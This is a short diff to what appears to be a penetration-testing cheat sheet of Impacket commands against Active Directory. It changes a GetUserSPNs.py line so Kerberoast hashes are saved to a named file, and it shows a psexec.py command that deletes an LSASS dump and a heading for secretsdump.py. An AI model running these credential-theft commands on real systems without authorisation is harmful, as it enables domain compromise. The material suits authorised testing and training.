@@ -20,7 +20,7 @@ psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp"
 ## GetUserSPNs.py
 
 ``` bash
-GetUserSPNs.py -dc-ip 192.168.1.1 contoso.local/jdupond:'P@$$w0rd' -save
+GetUserSPNs.py -dc-ip 192.168.1.1 contoso.local/jdupond:'P@$$w0rd' -outputfile "kerberoast_contoso.local_13100.hash"
 ```
 
 ## secretsdump.py
